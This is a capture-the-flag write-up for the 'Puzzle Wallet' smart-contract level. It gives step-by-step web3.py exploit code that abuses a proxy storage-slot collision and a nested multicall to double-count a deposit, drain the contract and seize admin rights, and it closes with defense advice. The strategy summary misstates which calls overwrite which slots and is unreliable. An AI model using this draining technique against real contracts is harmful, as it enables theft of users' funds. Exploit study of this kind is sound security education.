# 🧩 Level 24: Puzzle Wallet
> **Difficulty**: Very Hard  
> **Category**: Proxy patterns, delegatecall, storage collision, MultiCall Abuse

## 🔍 Challenge Overview

In this challenge, we exploit storage slot collisions and delegatecall behavior in a proxy pattern to take over ownership of a contract and drain its balance. This is a test of both your smart contract fundamentals and understanding of upgradeable proxy mechanics.

---
## 📜 Contract Summary
We are provided with two contracts:

### `PuzzleProxy` (inherits from `UpgradeableProxy`)
- Holds pendingAdmin and admin in storage slots 0 and 1.
- Implements a fallback that delegatecalls to the implementation contract (initially PuzzleWallet).

### `PuzzleWallet`
- Holds owner and maxBalance in slots 0 and 1.
- Has whitelisted and balances mappings.
- Has a multicall(bytes[]) function that allows batching calls, and uses delegatecall internally.

> Due to storage layout overlap, changing owner in PuzzleWallet affects pendingAdmin in PuzzleProxy, and maxBalance overlaps with admin.

---
## 🧠 Strategy Summary
- Whitelist yourself to be able to deposit.
- Exploit `multicall()` to call `deposit()` twice with a single msg.value, tricking the contract into crediting double.
- Drain funds using execute().
- Overwrite storage slot 0 with your address using setPendingAdmin() (via setMaxBalance()).
- Call `proposeNewAdmin()` to match slot 0 and 1, making you the final admin.
---
## 🛠️ Step-by-Step Attack Plan
```python
# Step 1: become owner
send_tx(proxy.functions.proposeNewAdmin(player))
```
```python
# Step 2: Add ourselves to whitelisted
send_tx(puzzle_wallet.functions.addToWhitelist(player))
```
```python
# Step 3: Encode inner deposit call
# We can't setMaxBalance, as address(this).balance != 0, so we should use multicall and batch transactions
inner_call = puzzle_wallet.functions.deposit().build_transaction({
    'gas': 100000,
    'value': w3.to_wei(0.001, 'ether'),
    'from': player
})['data']
```
```python
# Step 4: Encode inner multicall with just [deposit()]
inner_multicall = puzzle_wallet.functions.multicall([inner_call]).build_transaction({'gas': 200000})['data']
```
```python
# Step 5: Outer multicall: contains both deposit() and multicall([deposit()])
outer_multicall = puzzle_wallet.functions.multicall([
    inner_call, inner_multicall
]).build_transaction({'gas': 300000})['data']
# Now outer_multicall is your final calldata.
receipt = send_tx({
    'to': proxy.address,
    'value': w3.to_wei(0.001, 'ether'),
    'gas': 1_000_000,
    'gasPrice': w3.eth.gas_price,
    'data': outer_multicall
}, build=False)
```
```python
# Step 6: run execute to drain proxy contract balance
send_tx(puzzle_wallet.functions.execute(player, balance, b''))  # b'' # empty bytes for data
```
```python
# Step 7: call setMaxBalance to become admin, it shares same slot 1
max_balance_value = int(player, 16)  # Convert address string to integer
send_tx(puzzle_wallet.functions.setMaxBalance(max_balance_value))
```
Please check `solution_puzzle.py`. It is mostly self-explanatory

---
### 🧠 Key Takeaways
- Proxy and logic contracts share the same storage via delegatecall, so layout matters.
- Nested delegatecalls can trick accounting logic (e.g., double counting balance).
- Avoid storage slot collisions by reserving storage in proxy patterns.
- Always validate user input and enforce idempotency in batch functions.
---
### 🛡️ Defense Recommendations
- Never reuse storage slots between proxy and implementation contracts
- Enforce single-entry on multicall() to prevent reentrancy
- Ensure that proxy-specific variables are isolated, e.g. use EIP-1967 reserved slots
- Add robust access control checks on all critical setters
---
## ✍️ Author

defi-dojo – A curated collection of real-world smart contract exploit simulations, automated testing, and in-depth technical writeups.

Created and maintained with ❤️ by [yprakash](mailto:yprakash.518@gmail.com).